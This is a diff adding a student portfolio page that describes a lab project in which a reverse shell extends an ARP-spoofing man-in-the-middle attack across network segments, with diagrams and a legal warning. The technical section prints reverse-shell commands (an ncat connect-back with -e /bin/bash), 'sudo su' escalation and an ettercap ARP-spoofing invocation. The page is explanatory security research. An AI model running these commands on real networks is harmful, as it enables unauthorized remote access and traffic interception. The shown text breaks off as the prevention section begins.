@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Extending MiTM via reverse shells — Bailey Forbes</title>
+  <meta name="description" content="Security research with Deecon Precht: a reverse shell extends a local ARP-spoofing MiTM attack past its own network segment, on an isolated private network, plus the detection and prevention that stop it." />
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght,SOFT,WONK@9..144,400..700,0..100,0..1&family=IBM+Plex+Mono:wght@400&family=Sora:wght@400;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/css/styles.css" />
+  <script>
+    /* Display preferences (src/display.ts) applied before first paint, so a
+       saved theme never flashes. An absent attribute means "follow the OS". */
+    (function () {
+      try {
+        var r = document.documentElement; r.classList.add("js");
+        var p = JSON.parse(localStorage.getItem("bf-display") || "{}");
+        if (p.theme === "dark" || p.theme === "light") r.setAttribute("data-theme", p.theme);
+        if (p.contrast === "standard" || p.contrast === "high") r.setAttribute("data-contrast", p.contrast);
+        if (p.motion === "full" || p.motion === "reduced") r.setAttribute("data-motion", p.motion);
+        if (p.text === "large") r.setAttribute("data-text", "large");
+      } catch (e) {}
+    })();
+  </script>
+</head>
+<body data-page="projects">
+  <div class="site-ground" aria-hidden="true"></div>
+  <header class="site-header" data-site-header></header>
+  <main id="main">
+    <div class="wrap">
+      <header class="page-hero">
+        <div data-project-motif="relay"></div>
+        <nav class="breadcrumb" aria-label="Breadcrumb">
+          <ol>
+            <li><a href="/home/">Home</a></li>
+            <li><a href="/projects/">Projects</a></li>
+            <li><span aria-current="page">Extending MiTM via reverse shells</span></li>
+          </ol>
+        </nav>
+        <h1>Extending MiTM via reverse shells</h1>
+        <p class="page-meta">With Deecon Precht · Information Security · Jul 2024</p>
+        <p class="lede">
+          A local ARP-spoofing man-in-the-middle attack is confined to one network segment. This
+          work, built with Deecon Precht on an isolated private network, shows how a reverse
+          shell extends that reach past the segment it started on, and documents the traffic
+          monitoring, firewall, and intrusion-detection measures that catch and stop it.
+        </p>
+        <div class="hero-actions">
+          <a class="btn btn-primary" href="#timeline"><svg class="icon" viewBox="0 0 448 512" aria-hidden="true" focusable="false"><path d="M438.6 278.6c12.5-12.5 12.5-32.8 0-45.3l-160-160c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L338.8 224 32 224c-17.7 0-32 14.3-32 32s14.3 32 32 32l306.7 0L233.4 393.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l160-160z"/></svg>Jump to the timeline</a>
+        </div>
+      </header>
+
+      <dl class="stat-list">
+        <div>
+          <dt>2</dt>
+          <dd>Person team, with Deecon Precht</dd>
+        </div>
+        <div>
+          <dt>7</dt>
+          <dd>Tools used: Ettercap, NMap (which bundles netcat), MSFVenom or a scripted payload, SSH, TCPDump, Wireshark</dd>
+        </div>
+        <div>
+          <dt>4</dt>
+          <dd>Detections documented for the reverse shell: traffic analysis, firewall egress rules, endpoint protection, and IDS/IPS</dd>
+        </div>
+        <div>
+          <dt>3</dt>
+          <dd>Devices on the isolated lab network: victim, router, and attacker</dd>
+        </div>
+      </dl>
+
+      <div class="strength">
+        <p class="strength-label">Attack-and-defense security research</p>
+        <p class="strength-evidence">
+          Two-person Information Security research at Indiana University Southeast. It shows how
+          a reverse shell turns a local ARP-spoofing attack into one that can reach past its own
+          network, run entirely on an isolated private network, and covers the monitoring,
+          firewall, and intrusion-detection work that defends against it.
+        </p>
+      </div>
+
+      <div class="legal-note">
+        <p class="legal-note-label">Important</p>
+        <p>
+          This work was built and run entirely on an isolated private lab network, with every
+          device and address controlled by its own two authors. Reproducing it, the ARP spoofing
+          and the reverse shell alike, against a network or device without the owner's explicit
+          authorization is a federal crime under 18 U.S.C. § 1030 of the Computer Fraud and Abuse
+          Act, and under similar state and international law.
+        </p>
+      </div>
+
+      <div class="project-layout">
+        <div class="project-main">
+      <section class="prose" aria-labelledby="mitm-why-title">
+        <h2 id="mitm-why-title">Why it exists</h2>
+        <p>
+          Built with Deecon Precht on a private lab network we controlled end to end. A victim
+          host, a router, and an attacker host, all on addresses we assigned ourselves.
+        </p>
+        <p>
+          A man-in-the-middle, or MiTM, attack is a third party sitting between two devices that
+          believe they are talking directly to each other, able to read or change the traffic
+          passing between them. That attack is normally stuck on one local network. The question
+          was simple: could it be made to reach further, and what would actually catch it if it
+          did.
+        </p>
+        <p>
+          Every device on a network answers to two addresses: an IP address, like a street
+          address, and a MAC address, a fixed serial number built into its network hardware. ARP,
+          the Address Resolution Protocol, is how a device finds the MAC address that goes with an
+          IP address. It is the equivalent of calling out "who is at number 12" and trusting
+          whoever answers back.
+        </p>
+        <p>
+          ARP spoofing abuses that trust. The attacker answers on another device's behalf,
+          claiming its own MAC address belongs to the victim or the router, so traffic meant for
+          one of them is sent to the attacker instead. This only works locally, on the same
+          network segment as the devices being fooled, which is exactly the reach this work set
+          out to extend.
+        </p>
+
+        <figure class="diagram">
+          <svg viewBox="0 0 640 262" role="img" aria-labelledby="arp-diagram-title arp-diagram-desc">
+            <title id="arp-diagram-title">ARP spoofing redirects the victim's traffic through the attacker</title>
+            <desc id="arp-diagram-desc">
+              The victim and the router each send the attacker their real traffic, believing they are
+              talking to each other. The attacker keeps that up by sending each of them a forged ARP
+              reply that names the attacker's own MAC address as the other device's.
+            </desc>
+            <defs>
+              <marker id="arp-arrow-ok" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path class="diagram-marker-ok" d="M0 0 L10 5 L0 10 Z" />
+              </marker>
+              <marker id="arp-arrow-ok-alt" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path class="diagram-marker-ok-alt" d="M0 0 L10 5 L0 10 Z" />
+              </marker>
+              <marker id="arp-arrow-attack" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path class="diagram-marker-attack" d="M0 0 L10 5 L0 10 Z" />
+              </marker>
+              <marker id="arp-arrow-attack-alt" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path class="diagram-marker-attack-alt" d="M0 0 L10 5 L0 10 Z" />
+              </marker>
+            </defs>
+
+            <rect class="diagram-node" x="20" y="24" width="180" height="56" rx="4" />
+            <text class="diagram-node-title" x="110" y="48" text-anchor="middle">Victim</text>
+            <text class="diagram-node-meta" x="110" y="66" text-anchor="middle">192.168.1.50</text>
+
+            <rect class="diagram-node" x="440" y="24" width="180" height="56" rx="4" />
+            <text class="diagram-node-title" x="530" y="48" text-anchor="middle">Router</text>
+            <text class="diagram-node-meta" x="530" y="66" text-anchor="middle">192.168.1.1</text>
+
+            <rect class="diagram-node" x="220" y="186" width="200" height="56" rx="4" />
+            <text class="diagram-node-title" x="320" y="210" text-anchor="middle">Attacker (MiTM)</text>
+            <text class="diagram-node-meta" x="320" y="228" text-anchor="middle">192.168.1.76</text>
+
+            <!-- Each pair below arcs between the same two points, bowing to
+                 opposite sides, so two arrows sharing an endpoint never read
+                 as one floating, disconnected segment. -->
+            <path class="diagram-line-ok" marker-end="url(#arp-arrow-ok)" d="M90 80 Q189 104 250 186" />
+            <path class="diagram-line-attack" marker-end="url(#arp-arrow-attack)" d="M270 186 Q171 162 110 80" />
+            <path class="diagram-line-ok-alt" marker-end="url(#arp-arrow-ok-alt)" d="M370 186 Q444 104 550 80" />
+            <path class="diagram-line-attack-alt" marker-end="url(#arp-arrow-attack-alt)" d="M390 186 Q501 162 570 80" />
+          </svg>
+          <ul class="diagram-legend">
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-ok" x1="0" y1="5" x2="28" y2="5" /></svg>Victim → attacker: the victim's real traffic</li>
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-attack" x1="0" y1="5" x2="28" y2="5" /></svg>Attacker → victim: forged ARP reply</li>
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-ok-alt" x1="0" y1="5" x2="28" y2="5" /></svg>Attacker → router: forwarded on to its real destination</li>
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-attack-alt" x1="0" y1="5" x2="28" y2="5" /></svg>Attacker → router: forged ARP reply</li>
+          </ul>
+          <figcaption>Redrawn from the report.</figcaption>
+        </figure>
+
+        <p>
+          That locality is not a policy choice, it is the protocol itself. ARP operates at Layer
+          2 of the OSI model, the Data Link Layer, which only exists within one network segment. A
+          router bridges separate segments at Layer 3 and does not forward ARP traffic between
+          them, so a forged ARP reply simply stops at the router's edge. Spoofing it only ever
+          works within earshot.
+        </p>
+        <p>
+          A reverse shell is not a Layer 2 trick. It is an ordinary Layer 3/4 connection, the kind
+          a router forwards without a second thought. Once it gives the attacker a foothold on a
+          device, that device becomes the new vantage point: whatever network segment it later
+          joins, the same local ARP spoofing can be run again from there. The attacker hops
+          segment to segment with the compromised device rather than ever actually breaking
+          Layer 2's reach.
+        </p>
+
+        <figure class="diagram">
+          <svg viewBox="0 0 640 230" role="img" aria-labelledby="layer-diagram-title layer-diagram-desc">
+            <title id="layer-diagram-title">ARP stays inside one segment; a routed connection does not</title>
+            <desc id="layer-diagram-desc">
+              ARP spoofing operates at Layer 2 of the OSI model and never crosses a router into
+              another network segment. A reverse shell is an ordinary Layer 3/4 connection, the
+              kind a router forwards normally, so it can reach the attacker from any segment the
+              compromised device later joins.
+            </desc>
+            <defs>
+              <marker id="layer-arrow-ok" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path class="diagram-marker-ok" d="M0 0 L10 5 L0 10 Z" />
+              </marker>
+              <marker id="layer-arrow-attack" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path class="diagram-marker-attack" d="M0 0 L10 5 L0 10 Z" />
+              </marker>
+            </defs>
+
+            <rect class="diagram-node" x="20" y="60" width="240" height="70" rx="4" />
+            <text class="diagram-node-title" x="140" y="88" text-anchor="middle">This network segment</text>
+            <text class="diagram-node-meta" x="140" y="106" text-anchor="middle">ARP spoofing happens here</text>
+
+            <rect class="diagram-node" x="380" y="60" width="240" height="70" rx="4" />
+            <text class="diagram-node-title" x="500" y="88" text-anchor="middle">A different network</text>
+            <text class="diagram-node-meta" x="500" y="106" text-anchor="middle">reached only by routing</text>
+
+            <line class="diagram-boundary" x1="320" y1="24" x2="320" y2="200" />
+            <text class="diagram-edge-label" x="320" y="20" text-anchor="middle">router: Layer 2 stops here</text>
+
+            <path class="diagram-line-attack" marker-end="url(#layer-arrow-attack)" d="M60 130 Q140 164 220 130" />
+            <path class="diagram-line-ok" marker-end="url(#layer-arrow-ok)" d="M260 95 L380 95" />
+          </svg>
+          <ul class="diagram-legend">
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-attack" x1="0" y1="5" x2="28" y2="5" /></svg>ARP spoofing: Layer 2 only, stays inside this segment</li>
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-ok" x1="0" y1="5" x2="28" y2="5" /></svg>Reverse shell: an ordinary Layer 3/4 connection, crosses like any routed traffic</li>
+          </ul>
+          <figcaption>Why the attack needed a reverse shell to go anywhere past its own segment.</figcaption>
+        </figure>
+      </section>
+
+      <section class="prose" aria-labelledby="mitm-lab-title">
+        <h2 id="mitm-lab-title"><svg class="icon icon-head" viewBox="0 0 512 512" aria-hidden="true" focusable="false"><path d="M352 256c0 22.2-1.2 43.6-3.3 64l-185.3 0c-2.2-20.4-3.3-41.8-3.3-64s1.2-43.6 3.3-64l185.3 0c2.2 20.4 3.3 41.8 3.3 64zm28.8-64l123.1 0c5.3 20.5 8.1 41.9 8.1 64s-2.8 43.5-8.1 64l-123.1 0c2.1-20.6 3.2-42 3.2-64s-1.1-43.4-3.2-64zm112.6-32l-116.7 0c-10-63.9-29.8-117.4-55.3-151.6c78.3 20.7 142 77.5 171.9 151.6zm-149.1 0l-176.6 0c6.1-36.4 15.5-68.6 27-94.7c10.5-23.6 22.2-40.7 33.5-51.5C239.4 3.2 248.7 0 256 0s16.6 3.2 27.8 13.8c11.3 10.8 23 27.9 33.5 51.5c11.6 26 20.9 58.2 27 94.7zm-209 0L18.6 160C48.6 85.9 112.2 29.1 190.6 8.4C165.1 42.6 145.3 96.1 135.3 160zM8.1 192l123.1 0c-2.1 20.6-3.2 42-3.2 64s1.1 43.4 3.2 64L8.1 320C2.8 299.5 0 278.1 0 256s2.8-43.5 8.1-64zM194.7 446.6c-11.6-26-20.9-58.2-27-94.6l176.6 0c-6.1 36.4-15.5 68.6-27 94.6c-10.5 23.6-22.2 40.7-33.5 51.5C272.6 508.8 263.3 512 256 512s-16.6-3.2-27.8-13.8c-11.3-10.8-23-27.9-33.5-51.5zM135.3 352c10 63.9 29.8 117.4 55.3 151.6C112.2 482.9 48.6 426.1 18.6 352l116.7 0zm358.1 0c-30 74.1-93.6 130.9-171.9 151.6c25.5-34.2 45.2-87.7 55.3-151.6l116.7 0z"/></svg>Setting up and watching the lab, in plain terms</h2>
+        <p>
+          Three ordinary machines, not three mysteries. The whole lab was a handful of devices
+          talking to each other and to one shared router, the same shape as a home Wi-Fi network.
+          None of it touched the public internet.
+        </p>
+
+        <p><strong>Setting up the network.</strong> Every device got its own private address, the
+          network equivalent of a house number on a street nobody outside the lab could even see.</p>
+        <p>
+          One piece of router configuration, called <em>port forwarding</em>, told the router to
+          send anything addressed to one specific door straight through to one device. It works
+          like a receptionist with standing instructions to connect anyone who asks for a certain
+          extension directly to one particular desk, instead of asking every caller who they are
+          trying to reach. The lab opened two doors this way: one for the reverse shell, and one
+          for the SSH connection used later to retrieve the capture file.
+        </p>
+
+        <figure class="diagram">
+          <svg viewBox="0 0 640 210" role="img" aria-labelledby="pf-diagram-title pf-diagram-desc">
+            <title id="pf-diagram-title">Port forwarding sends one door straight to one device</title>
+            <desc id="pf-diagram-desc">
+              The router is set up so a request addressed to one specific port is sent straight
+              through to a single device inside the lab. A request for any other port is not
+              forwarded and goes nowhere.
+            </desc>
+            <defs>
+              <marker id="pf-arrow-ok" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path class="diagram-marker-ok" d="M0 0 L10 5 L0 10 Z" />
+              </marker>
+              <marker id="pf-arrow-ok-alt" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path class="diagram-marker-ok-alt" d="M0 0 L10 5 L0 10 Z" />
+              </marker>
+            </defs>
+
+            <rect class="diagram-node" x="20" y="74" width="160" height="56" rx="4" />
+            <text class="diagram-node-title" x="100" y="98" text-anchor="middle">Outside request</text>
+            <text class="diagram-node-meta" x="100" y="116" text-anchor="middle">door 4444</text>
+
+            <rect class="diagram-node" x="240" y="74" width="160" height="56" rx="4" />
+            <text class="diagram-node-title" x="320" y="98" text-anchor="middle">Router</text>
+            <text class="diagram-node-meta" x="320" y="116" text-anchor="middle">192.168.1.1</text>
+
+            <rect class="diagram-node" x="460" y="74" width="160" height="56" rx="4" />
+            <text class="diagram-node-title" x="540" y="98" text-anchor="middle">One device</text>
+            <text class="diagram-node-meta" x="540" y="116" text-anchor="middle">192.168.1.50</text>
+
+            <path class="diagram-line-ok" marker-end="url(#pf-arrow-ok)" d="M180 95 L240 95" />
+            <path class="diagram-line-ok-alt" marker-end="url(#pf-arrow-ok-alt)" d="M400 95 L460 95" />
+            <path class="diagram-line-attack" d="M100 130 Q200 175 300 175" />
+            <circle cx="300" cy="175" r="7" fill="none" class="diagram-line-attack" />
+          </svg>
+          <ul class="diagram-legend">
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-ok" x1="0" y1="5" x2="28" y2="5" /></svg>A request for the open door</li>
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-ok-alt" x1="0" y1="5" x2="28" y2="5" /></svg>Forwarded straight through to the one device</li>
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-attack" x1="0" y1="5" x2="28" y2="5" /></svg>A request for any other door: goes nowhere</li>
+          </ul>
+          <figcaption>How the lab's port forwarding was set up.</figcaption>
+        </figure>
+
+        <p><strong>Scouting the network, or "reconnaissance."</strong> Security personnel call
+          looking around before acting <em>reconnaissance</em>, "recon" for short. It just means
+          finding out what is there before touching anything.</p>
+        <p>
+          A tool called Nmap asked every address on the lab's little street, in turn, whether
+          anyone was home and what they were running, and noted who answered. It is the digital
+          version of walking a block, reading the house numbers, and noting which porch lights
+          are on, all without knocking on a single door.
+        </p>
+
+        <figure class="diagram">
+          <svg viewBox="0 0 640 220" role="img" aria-labelledby="recon-diagram-title recon-diagram-desc">
+            <title id="recon-diagram-title">Scanning the lab finds what is there before anything else happens</title>
+            <desc id="recon-diagram-desc">
+              A scanning tool asks every address on the lab's private range whether a device is
+              present. Addresses that answer are noted; addresses that do not answer are skipped.
+            </desc>
+            <defs>
+              <marker id="recon-arrow-ok" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path class="diagram-marker-ok" d="M0 0 L10 5 L0 10 Z" />
+              </marker>
+              <marker id="recon-arrow-ok-alt" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path class="diagram-marker-ok-alt" d="M0 0 L10 5 L0 10 Z" />
+              </marker>
+            </defs>
+
+            <rect class="diagram-node" x="20" y="82" width="150" height="56" rx="4" />
+            <text class="diagram-node-title" x="95" y="106" text-anchor="middle">Scanner</text>
+            <text class="diagram-node-meta" x="95" y="124" text-anchor="middle">asking</text>
+
+            <rect class="diagram-node" x="440" y="18" width="180" height="56" rx="4" />
+            <text class="diagram-node-title" x="530" y="42" text-anchor="middle">Address .50</text>
+            <text class="diagram-node-meta" x="530" y="60" text-anchor="middle">answers</text>
+
+            <rect class="diagram-node" x="440" y="146" width="180" height="56" rx="4" />
+            <text class="diagram-node-title" x="530" y="170" text-anchor="middle">Address .90</text>
+            <text class="diagram-node-meta" x="530" y="188" text-anchor="middle">no answer</text>
+
+            <path class="diagram-line-ok" marker-end="url(#recon-arrow-ok)" d="M170 95 Q300 60 440 46" />
+            <path class="diagram-line-ok-alt" marker-end="url(#recon-arrow-ok-alt)" d="M440 60 Q300 95 170 112" />
+            <path class="diagram-line-attack" d="M170 128 Q300 160 440 174" />
+            <circle cx="440" cy="174" r="7" fill="none" class="diagram-line-attack" />
+          </svg>
+          <ul class="diagram-legend">
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-ok" x1="0" y1="5" x2="28" y2="5" /></svg>Asks each address in turn</li>
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-ok-alt" x1="0" y1="5" x2="28" y2="5" /></svg>A device that is there answers</li>
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-attack" x1="0" y1="5" x2="28" y2="5" /></svg>No answer: nothing at that address</li>
+          </ul>
+          <figcaption>How the devices in the lab were found before any interception began.</figcaption>
+        </figure>
+
+        <div class="transcript">
+          <p class="transcript-bar">nmap · lab address range</p>
+          <pre><code><b>$ nmap -sn 192.168.1.0/24</b></code></pre>
+        </div>
+        <p class="evidence-note">
+          The ping-scan syntax from the report's own reconnaissance step: one request to each
+          address in the range, nothing more.
+        </p>
+
+        <p><strong>Watching the traffic, or "network analysis."</strong> To prove the interception
+          actually happened, rather than just assume it did, every piece of data moving through
+          the lab was recorded with a tool called tcpdump, roughly a dashboard camera that records
+          everything passing on a stretch of road.</p>
+        <p>
+          That recording was played back afterward in Wireshark, filtered down by protocol to
+          just the ARP traffic, the way you would skip straight to the few minutes of footage
+          that actually show the car you are interested in. The recording, not just the attack
+          appearing to work, is what confirmed the forged replies really arrived.
+        </p>
+
+        <figure class="diagram">
+          <svg viewBox="0 0 640 170" role="img" aria-labelledby="cap-diagram-title cap-diagram-desc">
+            <title id="cap-diagram-title">Capturing the traffic is what proves an attack worked</title>
+            <desc id="cap-diagram-desc">
+              Every packet crossing the lab network is recorded as it happens, then reviewed
+              afterward to confirm the interception actually took place rather than assuming it did.
+            </desc>
+            <defs>
+              <marker id="cap-arrow-ok" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path class="diagram-marker-ok" d="M0 0 L10 5 L0 10 Z" />
+              </marker>
+              <marker id="cap-arrow-ok-alt" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path class="diagram-marker-ok-alt" d="M0 0 L10 5 L0 10 Z" />
+              </marker>
+            </defs>
+
+            <rect class="diagram-node" x="20" y="57" width="170" height="56" rx="4" />
+            <text class="diagram-node-title" x="105" y="81" text-anchor="middle">Live traffic</text>
+            <text class="diagram-node-meta" x="105" y="99" text-anchor="middle">on the lab</text>
+
+            <rect class="diagram-node" x="235" y="57" width="170" height="56" rx="4" />
+            <text class="diagram-node-title" x="320" y="81" text-anchor="middle">tcpdump</text>
+            <text class="diagram-node-meta" x="320" y="99" text-anchor="middle">recording</text>
+
+            <rect class="diagram-node" x="450" y="57" width="170" height="56" rx="4" />
+            <text class="diagram-node-title" x="535" y="81" text-anchor="middle">Wireshark</text>
+            <text class="diagram-node-meta" x="535" y="99" text-anchor="middle">played back</text>
+
+            <path class="diagram-line-ok" marker-end="url(#cap-arrow-ok)" d="M190 85 L235 85" />
+            <path class="diagram-line-ok-alt" marker-end="url(#cap-arrow-ok-alt)" d="M405 85 L450 85" />
+          </svg>
+          <ul class="diagram-legend">
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-ok" x1="0" y1="5" x2="28" y2="5" /></svg>Every packet recorded as it crosses the lab</li>
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-ok-alt" x1="0" y1="5" x2="28" y2="5" /></svg>Reviewed afterward to confirm what happened</li>
+          </ul>
+          <figcaption>How the interception was recorded and verified.</figcaption>
+        </figure>
+
+        <p>
+          The recording had to reach the analysis machine before anyone could look at it, so it
+          travelled over the second forwarded door: the SSH connection, the same encrypted channel
+          used for a secure remote login, copied across with <code>scp</code> rather than emailed
+          or carried over on a drive.
+        </p>
+        <div class="transcript">
+          <p class="transcript-bar">representative syntax, from the report</p>
+          <pre><code><b>$ tcpdump -i wlan0 -w capture.pcap</b>
+<b>$ scp kali@192.168.1.50:~/capture.pcap ./capture.pcap</b></code></pre>
+        </div>
+        <p class="evidence-note">
+          The capture command and the file transfer, written the way the report gives them; not
+          output captured from an actual run.
+        </p>
+      </section>
+
+      <details class="disclosure">
+        <summary><span class="disclosure-toggle" aria-hidden="true"></span>Read the technical write-up</summary>
+        <div class="disclosure-body">
+          <div class="disclosure-body-inner">
+
+      <section class="prose">
+        <h2><svg class="icon icon-head" viewBox="0 0 576 512" aria-hidden="true" focusable="false"><path d="M9.4 86.6C-3.1 74.1-3.1 53.9 9.4 41.4s32.8-12.5 45.3 0l192 192c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L178.7 256 9.4 86.6zM256 416l288 0c17.7 0 32 14.3 32 32s-14.3 32-32 32l-288 0c-17.7 0-32-14.3-32-32s14.3-32 32-32z"/></svg>Extending the attack</h2>
+        <p>
+          A reverse shell flips the usual connection. Instead of an attacker connecting in to a
+          target, the target machine opens an outbound connection back out to the attacker.
+        </p>
+        <p>
+          That one flip is what makes the extension possible. Outbound connections are what most
+          firewalls are configured to allow, so a reverse shell tends to cross boundaries an
+          inbound connection would not. It also survives a victim whose address changes, since the
+          victim is the one reaching out to a fixed point rather than the other way around.
+        </p>
+        <p>
+          Getting that shell open still takes a first step somewhere else: a payload has to reach
+          the victim's machine, commonly through phishing, an existing vulnerability, or social
+          engineering, and then actually be run before any of what follows can happen.
+        </p>
+        <p>
+          Once that shell is open, the attacker is no longer limited to commands run from their
+          own machine. They are running commands as the compromised device, on whatever network
+          segments that device can reach.
+        </p>
+
+        <figure class="diagram">
+          <svg viewBox="0 0 640 220" role="img" aria-labelledby="rs-diagram-title rs-diagram-desc">
+            <title id="rs-diagram-title">A reverse shell crosses the firewall an inbound connection could not</title>
+            <desc id="rs-diagram-desc">
+              A firewall configured to block inbound connections still allows the victim's own
+              outbound connection out. A reverse shell uses that outbound connection, so the
+              attacker's commands travel over a channel the victim opened.
+            </desc>
+            <defs>
+              <marker id="rs-arrow-ok" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path class="diagram-marker-ok" d="M0 0 L10 5 L0 10 Z" />
+              </marker>
+              <marker id="rs-arrow-attack" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+                <path class="diagram-marker-attack" d="M0 0 L10 5 L0 10 Z" />
+              </marker>
+            </defs>
+
+            <rect class="diagram-node" x="30" y="64" width="170" height="56" rx="4" />
+            <text class="diagram-node-title" x="115" y="88" text-anchor="middle">Victim</text>
+            <text class="diagram-node-meta" x="115" y="106" text-anchor="middle">behind the firewall</text>
+
+            <rect class="diagram-node" x="440" y="64" width="170" height="56" rx="4" />
+            <text class="diagram-node-title" x="525" y="88" text-anchor="middle">Attacker</text>
+            <text class="diagram-node-meta" x="525" y="106" text-anchor="middle">listening</text>
+
+            <line class="diagram-boundary" x1="300" y1="16" x2="300" y2="204" />
+            <text class="diagram-edge-label" x="300" y="12" text-anchor="middle">firewall</text>
+
+            <path class="diagram-line-attack" marker-end="url(#rs-arrow-attack)" d="M440 80 L200 80" />
+            <circle cx="300" cy="80" r="7" fill="none" class="diagram-line-attack" />
+
+            <path class="diagram-line-ok" marker-end="url(#rs-arrow-ok)" d="M200 104 L440 104" />
+          </svg>
+          <ul class="diagram-legend">
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-attack" x1="0" y1="5" x2="28" y2="5" /></svg>Inbound connection: blocked at the firewall</li>
+            <li><svg class="diagram-legend-swatch" viewBox="0 0 28 10" aria-hidden="true"><line class="diagram-line-ok" x1="0" y1="5" x2="28" y2="5" /></svg>Outbound reverse shell: allowed, then carries the attacker's commands</li>
+          </ul>
+          <figcaption>
+            Redrawn from the report. The attacker's own inbound attempt is stopped at the
+            firewall; the victim's outbound connection is not.
+          </figcaption>
+        </figure>
+
+        <p>
+          That is the actual finding. A device compromised by a reverse shell can be made to
+          carry out ARP spoofing of its own, against other devices on networks it connects to
+          later. The initial, local attack effectively travels with the compromised device
+          rather than staying put.
+        </p>
+        <p>
+          Ettercap did the ARP spoofing and MiTM interception. Netcat, which Kali packages
+          alongside NMap rather than as its own install, run as <code>ncat</code> rather than
+          <code>nc</code> for cross-platform compatibility, opened the reverse shell. MSFVenom
+          generated the payload that triggers it, though a short script using a programming
+          language's own networking libraries works the same way.
+        </p>
+        <p>
+          MSFVenom's payloads were not reliable in our testing, which is worth noting on its own.
+          A textbook tool chain does not always behave like the textbook.
+        </p>
+
+        <div class="transcript">
+          <p class="transcript-bar">representative syntax, from the report</p>
+          <pre><code># Attacker: listen for the victim's connection
+<b>$ ncat -nlvp 4444 -e /bin/bash</b>
+
+# Victim: connect back out to the attacker
+<b>$ ncat 192.168.1.76 4444 -e /bin/bash</b>
+
+# Inside the shell: a regular account, then root
+<b>$ whoami</b>
+<b>$ sudo su</b>
+<b>$ whoami</b>
+
+# Ettercap, run from the now-compromised device
+<b>$ ettercap -T -S -i wlan0 -M arp:remote \</b>
+<b>    /192.168.1.1// /192.168.1.50//</b></code></pre>
+        </div>
+        <p class="evidence-note">
+          The listener, the connect-back, the privilege escalation that most of the rest needs,
+          and the Ettercap invocation, written the way the report gives them; not output captured
+          from an actual run.
+        </p>
+
+        <p>
+          We used <code>tcpdump</code> to capture the attack traffic and <code>Wireshark</code>
+          to read it back afterward, which is how the interception was actually verified rather
+          than assumed.
+        </p>
+        <p>
+          The commands above are representative syntax, not a copy-paste reproduction. The
+          report's own version ties each one to this lab's specific devices and adds a step that
+          pulls a saved Wi-Fi password out of the victim's own network configuration; that step,
+          and the full tied-together sequence, stay out of this page and are available on request
+          instead.
+        </p>
+      </section>
+
+          </div>
+        </div>
+      </details>
+
+      <details class="disclosure">
+        <summary><span class="disclosure-toggle" aria-hidden="true"></span>Read the prevention strategies</summary>
+        <div class="disclosure-body">
+          <div class="disclosure-body-inner">
+
+      <section class="prose">
